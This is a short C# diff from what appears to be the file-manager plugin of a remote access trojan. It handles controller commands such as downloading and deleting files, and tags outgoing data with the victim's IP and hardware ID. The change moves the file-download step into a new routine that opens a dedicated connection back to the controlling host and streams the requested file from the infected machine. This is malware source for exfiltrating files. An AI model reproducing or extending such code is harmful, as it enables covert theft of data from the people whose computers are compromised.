@@ -31,10 +31,7 @@ namespace Plugin
                     break;
 
                 case PacketType.FM_DOWNLOAD_FILE:
-                    filePath = ((DownloadFilePacket)loadingAPI.currentPacket).fileName;
-                    byte[] fileRead = DownloadFile.ReadFile(filePath);
-                    DownloadFilePacket downloadFilePacket = new DownloadFilePacket(fileRead, filePath, loadingAPI.baseIp, loadingAPI.HWID);
-                    ClientSender(loadingAPI.host, loadingAPI.key, downloadFilePacket);
+                    ClientFileSender(loadingAPI);
                     break;
 
                 case PacketType.FM_DELETE_FILE:
@@ -77,6 +74,17 @@ namespace Plugin
                     return;
             }
             Miscellaneous.CleanMemory();
+        }
+
+        private static void ClientFileSender(LoadingAPI loadingAPI) 
+        {
+            string filePath = ((DownloadFilePacket)loadingAPI.currentPacket).fileName;
+            DownloadClientHandler clientHandler = new DownloadClientHandler(loadingAPI);
+            clientHandler.ConnectStart();
+            while (!clientHandler.Connected)
+                Thread.Sleep(125);
+
+            clientHandler.StartSendingFile(filePath);
         }
 
         private static void ClientSender(Host host, string key, IPacket packet) 
